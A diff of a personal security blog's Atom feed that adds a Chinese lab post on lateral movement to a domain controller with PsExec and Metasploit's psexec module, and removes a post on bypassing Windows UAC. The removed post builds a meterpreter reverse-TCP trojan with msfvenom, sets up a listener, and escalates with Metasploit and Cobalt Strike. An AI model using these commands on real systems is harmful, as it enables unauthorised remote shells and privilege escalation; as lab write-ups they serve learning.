@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sherlocz.github.io/"/>
-  <updated>2020-02-03T09:18:40.506Z</updated>
+  <updated>2020-02-04T11:30:38.962Z</updated>
   <id>http://sherlocz.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>利用PsExec进行横向渗透</title>
+    <link href="http://sherlocz.github.io/2020/02/04/%E5%88%A9%E7%94%A8PsExec%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"/>
+    <id>http://sherlocz.github.io/2020/02/04/利用PsExec进行横向渗透/</id>
+    <published>2020-02-04T09:44:00.000Z</published>
+    <updated>2020-02-04T11:30:38.962Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ul><li>需要目标机器开启了ADMIN$共享(默认开启)</li><li>建立了IPC连接，可以不输入账号密码连接到CMD窗口</li></ul><p>下载地址:<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p>优点：可直接获取SYSTEM权限的交互式shell<br>缺点：利用时会产生一个Psecex的服务，这个服务会产生日志文件，容易溯源</p><h1 id="模拟利用过程"><a href="#模拟利用过程" class="headerlink" title="模拟利用过程"></a>模拟利用过程</h1><ul><li>Win Server 2012 R2(DC)</li><li>Win 7(域中的一台机器)</li></ul><h2 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h2><p>我们现在用Win7去攻击域控，在win7下cmd</p><p>首先看看ip<br><img src="/2020/02/04/利用PsExec进行横向渗透/ipconfig.png" alt><br>没发现域控在那台机器，win7的ip是192.168.43.102<br><img src="/2020/02/04/利用PsExec进行横向渗透/domain.png" alt><br>查看域<br><img src="/2020/02/04/利用PsExec进行横向渗透/hacke.png" alt><br>查看域内其他主机<br><img src="/2020/02/04/利用PsExec进行横向渗透/nslookup.png" alt><br>利用nslookup定位DC</p><p>这里我并未对DC做设置，所以默认的时候ADMIN$是共享状态，你也可以使用net share命令查看共享的资源</p><h2 id="无IPC连接"><a href="#无IPC连接" class="headerlink" title="无IPC连接"></a>无IPC连接</h2><p>我们在win7的机器上查看了解情况，若无共享的连接，则我们在使用PsExec的时候需要使用账号密码进行验证<br><img src="/2020/02/04/利用PsExec进行横向渗透/use.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.43.100 -u username -p password</span><br></pre></td></tr></table></figure><p><img src="/2020/02/04/利用PsExec进行横向渗透/none.png" alt><br>无需弹出新的cmd窗口，直接拿下域控</p><h2 id="有IPC连接"><a href="#有IPC连接" class="headerlink" title="有IPC连接"></a>有IPC连接</h2><p><img src="/2020/02/04/利用PsExec进行横向渗透/yes.png" alt></p><p>这个时候无需验证账号密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.43.100 cmd.exe</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/04/利用PsExec进行横向渗透/2.png" alt><br>成功啦~</p><h2 id="Msf中的Psexec模块"><a href="#Msf中的Psexec模块" class="headerlink" title="Msf中的Psexec模块"></a>Msf中的Psexec模块</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set RHOST 192.168.43.100</span><br><span class="line">set smbuser usernmae</span><br><span class="line">set smbpass password</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2020/02/04/利用PsExec进行横向渗透/msf.png" alt></p><p>这样就利用成功了</p><p>总的来说这个psexec利用的方式就是，只要服务器上面有连接的IPC，就可以搞出cmd。</p><p>差不多就这样吧</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;利用条件&quot;&gt;&lt;a href=&quot;#利用条件&quot; class=&quot;headerlink&quot; title=&quot;利用条件&quot;&gt;&lt;/a&gt;利用条件&lt;/h1&gt;&lt;ul&gt;
+&lt;li&gt;需要目标机器开启了ADMIN$共享(默认开启)&lt;/li&gt;
+&lt;li&gt;建立了IPC连接，可以不输入账号密码连接到CM
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>Hash传递相关知识点</title>
@@ -448,27 +472,6 @@
     
     
       <category term="注入" scheme="http://sherlocz.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Windows下bypassuac</title>
-    <link href="http://sherlocz.github.io/2019/11/08/Windows%E4%B8%8Bbypassuac/"/>
-    <id>http://sherlocz.github.io/2019/11/08/Windows下bypassuac/</id>
-    <published>2019-11-08T11:27:00.000Z</published>
-    <updated>2020-01-13T04:49:31.110Z</updated>
-    
-    <content type="html"><![CDATA[<p>一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！<br><a id="more"></a></p><h1 id="uac"><a href="#uac" class="headerlink" title="uac"></a>uac</h1><p>有的时候我们拿了一个shell，不晓得管理员的密码，3389也打不开是不是很操刀！就像这样<br><img src="/2019/11/08/Windows下bypassuac/error.png" alt><br>这个问题是要用管理员打开cmd才能添加账号<br><img src="/2019/11/08/Windows下bypassuac/cmd_1.png" alt><br><img src="/2019/11/08/Windows下bypassuac/cmd_2.png" alt><br>这个时候我们就要绕过windows的uac策略了</p><h1 id="Msf-bypassuac"><a href="#Msf-bypassuac" class="headerlink" title="Msf bypassuac"></a>Msf bypassuac</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#生成一个木马文件，放到目标机器上面</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.43.128 --platform windows lport=4444 -f exe &gt; uac.exe</span><br><span class="line"></span><br><span class="line">#打开msfconsole，设置监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.43.128</span><br><span class="line">run</span><br><span class="line">#然后在目标机器上面运行传上去的木马文件</span><br></pre></td></tr></table></figure><p>这个时候我们拿到了meterpreter<br><img src="/2019/11/08/Windows下bypassuac/getsystem_1.png" alt></p><p>getsystem是有问题的，说明不是最高权限</p><p>这个时候我们返回msf控制台，并保留session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#设置uac的payload</span><br><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">set session 3</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/2019/11/08/Windows下bypassuac/getsystem_2.png" alt><br>这个时候getsystem应该没有问题了<br><img src="/2019/11/08/Windows下bypassuac/success.png" alt></p><p>bypassuac成功，可以添加用户了</p><h1 id="cobalt-strike-bypassuac"><a href="#cobalt-strike-bypassuac" class="headerlink" title="cobalt strike bypassuac"></a>cobalt strike bypassuac</h1><p><img src="/2019/11/08/Windows下bypassuac/shell.png" alt><br>一样的，首先生成一个后门木马，上传到目标机器上面，并且运行<br><img src="/2019/11/08/Windows下bypassuac/sherl.png" alt><br>看到这里有回显了，右键进入beacon，输入bypassuac<br><img src="/2019/11/08/Windows下bypassuac/csbypass.png" alt><br>然后设置好监听的端口，输入命令<br><img src="/2019/11/08/Windows下bypassuac/cs.png" alt><br>就成功啦~</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;一直都搞不懂bypassuac是啥，到底有啥用啊，后来经过高人的指点，突然之间就悟了！&lt;br&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="提权" scheme="http://sherlocz.github.io/tags/%E6%8F%90%E6%9D%83/"/>
     
   </entry>
   
